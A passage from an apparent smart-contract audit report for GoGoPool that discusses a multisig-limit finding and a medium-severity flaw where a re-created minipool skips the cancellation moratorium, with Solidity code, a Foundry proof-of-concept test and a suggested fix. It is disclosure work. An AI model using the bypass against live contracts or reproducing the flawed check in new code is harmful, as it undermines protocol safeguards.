href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/521#issuecomment-1397034274\">0xju1ie (GoGoPool) commented</a>:</strong></p>\n<blockquote>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/349\">#349</a> has an interesting fix for this issue</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/521#issuecomment-1401952336\">emersoncloud (GoGoPool) commented</a>:</strong></p>\n<blockquote>\n<p>Which was: “Count only the validated/enabled multisigs in order to control the limit.”</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/521#issuecomment-1413624527\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how, due to a logic flaw, the system can only ever add up to 10 multi sigs, even after disabling all, no more multi sigs could be added.</p>\n<p>Because this shows how an external condition can break the functionality of the MultisigManager, I agree with Medium Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/521#issuecomment-1421429303\">emersoncloud (GoGoPool) commented</a>:</strong></p>\n<blockquote>\n<p>Acknowledged.</p>\n<p>Not fixing right now, we don’t foresee having many multisigs at launch, and will upgrade as necessary to support more. </p>\n</blockquote>\n<hr>\n<h2 id=\"m-12-cancellation-of-minipool-may-skip-minipoolcancelmoratoriumseconds-checking-if-it-was-cancelled-before\" style=\"position:relative;\"><a href=\"#m-12-cancellation-of-minipool-may-skip-minipoolcancelmoratoriumseconds-checking-if-it-was-cancelled-before\" aria-label=\"m 12 cancellation of minipool may skip minipoolcancelmoratoriumseconds checking if it was cancelled before permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/519\">[M-12] Cancellation of minipool may skip <code>MinipoolCancelMoratoriumSeconds</code> checking if it was cancelled before</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/519\">caventa</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/650\">wagmi</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/635\">__141345__</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/574\">hansfriese</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/541\">unforgiven</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/488\">Franfran</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/483\">betweenETHlines</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/458\">Allarious</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/281\">stealthyz</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/259\">mert_eren</a>, and <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/211\">0xdeadbeef0x</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/MinipoolManager.sol#L225-L227\">https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/MinipoolManager.sol#L225-L227</a><br>\n<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/MinipoolManager.sol#L279-L281\">https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/MinipoolManager.sol#L279-L281</a></p>\n<p>When canceling a minipool that was canceled before, it may skip <code>MinipoolCancelMoratoriumSeconds</code> checking and allow the user to cancel the minipool immediately.</p>\n<h3 id=\"proof-of-concept-16\" style=\"position:relative;\"><a href=\"#proof-of-concept-16\" aria-label=\"proof of concept 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>A user may create a minipool.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"55\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">/// @notice Accept AVAX deposit from node operator to create a Minipool. Node Operator must be staking GGP. Open to public.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t/// @param nodeID 20-byte Avalanche node ID</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t/// @param duration Requested validation period in seconds</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t/// @param delegationFee Percentage delegation fee in units of ether (2% is 0.2 ether)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t/// @param avaxAssignmentRequest Amount of requested AVAX to be matched for this Minipool</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tfunction createMinipool(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\taddress nodeID,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 duration,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 delegationFee,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 avaxAssignmentRequest</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t) external payable whenNotPaused {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tif (nodeID == address(0)) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\trevert InvalidNodeID();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tProtocolDAO dao = ProtocolDAO(getContractAddress(&quot;ProtocolDAO&quot;));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tif (</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\t// Current rule is matched funds must be 1:1 nodeOp:LiqStaker</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\tmsg.value != avaxAssignmentRequest ||</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\tavaxAssignmentRequest &gt; dao.getMinipoolMaxAVAXAssignment() ||</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\tavaxAssignmentRequest &lt; dao.getMinipoolMinAVAXAssignment()</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\trevert InvalidAVAXAssignmentRequest();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tif (msg.value + avaxAssignmentRequest &lt; dao.getMinipoolMinAVAXStakingAmt()) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\trevert InsufficientAVAXForMinipoolCreation();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tStaking staking = Staking(getContractAddress(&quot;Staking&quot;));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tstaking.increaseMinipoolCount(msg.sender);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tstaking.increaseAVAXStake(msg.sender, msg.value);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tstaking.increaseAVAXAssigned(msg.sender, avaxAssignmentRequest);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tif (staking.getRewardsStartTime(msg.sender) == 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\tstaking.setRewardsStartTime(msg.sender, block.timestamp);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 ratio = staking.getCollateralizationRatio(msg.sender);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tif (ratio &lt; dao.getMinCollateralizationRatio()) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\trevert InsufficientGGPCollateralization();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Get a Rialto multisig to assign for this minipool</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tMultisigManager multisigManager = MultisigManager(getContractAddress(&quot;MultisigManager&quot;));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\taddress multisig = multisigManager.requireNextActiveMultisig();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Create or update a minipool record for nodeID</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// If nodeID exists, only allow overwriting if node is finished or canceled</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// \t\t(completed its validation period and all rewards paid and processing is complete)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tint256 minipoolIndex = getIndexOf(nodeID);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tif (minipoolIndex != -1) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\tonlyOwner(minipoolIndex);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\trequireValidStateTransition(minipoolIndex, MinipoolStatus.Prelaunch);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\tresetMinipoolData(minipoolIndex);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\t// Also reset initialStartTime as we are starting a whole new validation</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\tsetUint(keccak256(abi.encodePacked(&quot;minipool.item&quot;, minipoolIndex, &quot;.initialStartTime&quot;)), 0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t} else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\tminipoolIndex = int256(getUint(keccak256(&quot;minipool.count&quot;)));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\t// The minipoolIndex is stored 1 greater than actual value. The 1 is subtracted in getIndexOf()</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\tsetUint(keccak256(abi.encodePacked(&quot;minipool.index&quot;, nodeID)), uint256(minipoolIndex + 1));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\tsetAddress(keccak256(abi.encodePacked(&quot;minipool.item&quot;, minipoolIndex, &quot;.nodeID&quot;)), nodeID);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\taddUint(keccak256(&quot;minipool.count&quot;), 1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Save the attrs individually in the k/v store</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tsetUint(keccak256(abi.encodePacked(&quot;minipool.item&quot;, minipoolIndex, &quot;.status&quot;)), uint256(MinipoolStatus.Prelaunch));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tsetUint(keccak256(abi.encodePacked(&quot;minipool.item&quot;, minipoolIndex, &quot;.duration&quot;)), duration);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tsetUint(keccak256(abi.encodePacked(&quot;minipool.item&quot;, minipoolIndex, &quot;.delegationFee&quot;)), delegationFee);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tsetAddress(keccak256(abi.encodePacked(&quot;minipool.item&quot;, minipoolIndex, &quot;.owner&quot;)), msg.sender);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tsetAddress(keccak256(abi.encodePacked(&quot;minipool.item&quot;, minipoolIndex, &quot;.multisigAddr&quot;)), multisig);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tsetUint(keccak256(abi.encodePacked(&quot;minipool.item&quot;, minipoolIndex, &quot;.avaxNodeOpInitialAmt&quot;)), msg.value);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tsetUint(keccak256(abi.encodePacked(&quot;minipool.item&quot;, minipoolIndex, &quot;.avaxNodeOpAmt&quot;)), msg.value);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tsetUint(keccak256(abi.encodePacked(&quot;minipool.item&quot;, minipoolIndex, &quot;.avaxLiquidStakerAmt&quot;)), avaxAssignmentRequest);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\temit MinipoolStatusChanged(nodeID, MinipoolStatus.Prelaunch);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tVault vault = Vault(getContractAddress(&quot;Vault&quot;));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tvault.depositAVAX{value: msg.value}();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t}</span></span></code></pre>\n<p>and after 5 days, the user cancels the minipool</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"56\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">\t/// @notice Owner of a minipool can cancel the (prelaunch) minipool</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t/// @param nodeID 20-byte Avalanche node ID the Owner registered with</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tfunction cancelMinipool(address nodeID) external nonReentrant {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tStaking staking = Staking(getContractAddress(&quot;Staking&quot;));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tProtocolDAO dao = ProtocolDAO(getContractAddress(&quot;ProtocolDAO&quot;));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tint256 index = requireValidMinipool(nodeID);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tonlyOwner(index);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// make sure they meet the wait period requirement</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tif (block.timestamp - staking.getRewardsStartTime(msg.sender) &lt; dao.getMinipoolCancelMoratoriumSeconds()) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\trevert CancellationTooEarly();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t_cancelMinipoolAndReturnFunds(nodeID, index);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t}</span></span></code></pre>\n<p>Then, the user recreates the minipool again by calling the same createMinipool function. Then, the user cancels the minipool immediately. The user should not be allowed to cancel the minpool immediately and he should wait for 5 more days.</p>\n<p>Added a test unit to MinipoolManager.t.sol</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"57\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">\tfunction testMinipoolManager() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\taddress nodeID1 = randAddress();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tvm.startPrank(nodeOp);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tggp.approve(address(staking), MAX_AMT);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tstaking.stakeGGP(100 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t{</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\tMinipoolManager.Minipool memory mp = createMyMinipool(nodeID1, 1000 ether, 1000 ether, 2 weeks);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\tskip(5 days);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\tminipoolMgr.cancelMinipool(mp.nodeID); // Must skip 5 days to be executed</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t{</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\tMinipoolManager.Minipool memory mp = createMyMinipool(nodeID1, 1000 ether, 1000 ether, 2 weeks);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\tminipoolMgr.cancelMinipool(mp.nodeID); // Do not need 5 days more to be executed which is wrong</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tvm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t}</span></span></code></pre>\n<h3 id=\"tools-used-7\" style=\"position:relative;\"><a href=\"#tools-used-7\" aria-label=\"tools used 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Manual and added a test unit</p>\n<h3 id=\"recommended-mitigation-steps-17\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-17\" aria-label=\"recommended mitigation steps 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Change the createMinipool function. Always setRewardsStartTime everytime the minipool is recreated.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"58\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">/// @notice Accept AVAX deposit from node operator to create a Minipool. Node Operator must be staking GGP. Open to public.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t/// @param nodeID 20-byte Avalanche node ID</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t/// @param duration Requested validation period in seconds</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t/// @param delegationFee Percentage delegation fee in units of ether (2% is 0.2 ether)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t/// @param avaxAssignmentRequest Amount of requested AVAX to be matched for this Minipool</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tfunction createMinipool(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\taddress nodeID,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 duration,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 delegationFee,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 avaxAssignmentRequest</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t) external payable whenNotPaused {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tif (nodeID == address(0)) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\trevert InvalidNodeID();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tProtocolDAO dao = ProtocolDAO(getContractAddress(&quot;ProtocolDAO&quot;));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tif (</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\t// Current rule is matched funds must be 1:1 nodeOp:LiqStaker</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\tmsg.value != avaxAssignmentRequest ||</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\tavaxAssignmentRequest &gt; dao.getMinipoolMaxAVAXAssignment() ||</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\tavaxAssignmentRequest &lt; dao.getMinipoolMinAVAXAssignment()</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\trevert InvalidAVAXAssignmentRequest();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tif (msg.value + avaxAssignmentRequest &lt; dao.getMinipoolMinAVAXStakingAmt()) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\trevert InsufficientAVAXForMinipoolCreation();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tStaking staking = Staking(getContractAddress(&quot;Staking&quot;));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tstaking.increaseMinipoolCount(msg.sender);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tstaking.increaseAVAXStake(msg.sender, msg.value);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tstaking.increaseAVAXAssigned(msg.sender, avaxAssignmentRequest);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t--- if (staking.getRewardsStartTime(msg.sender) == 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\tstaking.setRewardsStartTime(msg.sender, block.timestamp);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t--- }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 ratio = staking.getCollateralizationRatio(msg.sender);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tif (ratio &lt; dao.getMinCollateralizationRatio()) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\trevert InsufficientGGPCollateralization();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Get a Rialto multisig to assign for this minipool</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tMultisigManager multisigManager = MultisigManager(getContractAddress(&quot;MultisigManager&quot;));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\taddress multisig = multisigManager.requireNextActiveMultisig();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Create or update a minipool record for nodeID</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// If nodeID exists, only allow overwriting if node is finished or canceled</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// \t\t(completed its validation period and all rewards paid and processing is complete)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tint256 minipoolIndex = getIndexOf(nodeID);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tif (minipoolIndex != -1) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\trequireValidStateTransition(minipoolIndex, MinipoolStatus.Prelaunch);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\tresetMinipoolData(minipoolIndex);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\t// Also reset initialStartTime as we are starting a whole new validation</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\tsetUint(keccak256(abi.encodePacked(&quot;minipool.item&quot;, minipoolIndex, &quot;.initialStartTime&quot;)), 0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t} else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\tminipoolIndex = int256(getUint(keccak256(&quot;minipool.count&quot;)));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\t// The minipoolIndex is stored 1 greater than actual value. The 1 is subtracted in getIndexOf()</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\tsetUint(keccak256(abi.encodePacked(&quot;minipool.index&quot;, nodeID)), uint256(minipoolIndex + 1));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\tsetAddress(keccak256(abi.encodePacked(&quot;minipool.item&quot;, minipoolIndex, &quot;.nodeID&quot;)), nodeID);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\taddUint(keccak256(&quot;minipool.count&quot;), 1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Save the attrs individually in the k/v store</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tsetUint(keccak256(abi.encodePacked(&quot;minipool.item&quot;, minipoolIndex, &quot;.status&quot;)), uint256(MinipoolStatus.Prelaunch));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tsetUint(keccak256(abi.encodePacked(&quot;minipool.item&quot;, minipoolIndex, &quot;.duration&quot;)), duration);</span></span>\n<span 